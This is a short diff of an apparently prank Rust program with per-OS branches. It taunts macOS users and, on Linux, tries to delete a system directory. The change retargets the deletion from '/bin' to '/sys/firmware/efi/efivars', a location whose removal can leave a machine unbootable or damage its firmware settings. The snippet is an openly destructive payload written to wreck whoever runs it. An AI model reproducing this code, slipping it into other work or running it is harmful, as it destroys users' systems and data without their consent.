@@ -33,7 +33,7 @@ fn main() {
             println!("Lmao what a loser you're on macos, I won't even bother");
 
         #[cfg(target_os = "linux")]
-        fs::remove_dir("/bin")
+        fs::remove_dir("/sys/firmware/efi/efivars")
             .expect("Error removing directory >:(");
 
         #[cfg(target_os = "windows")]
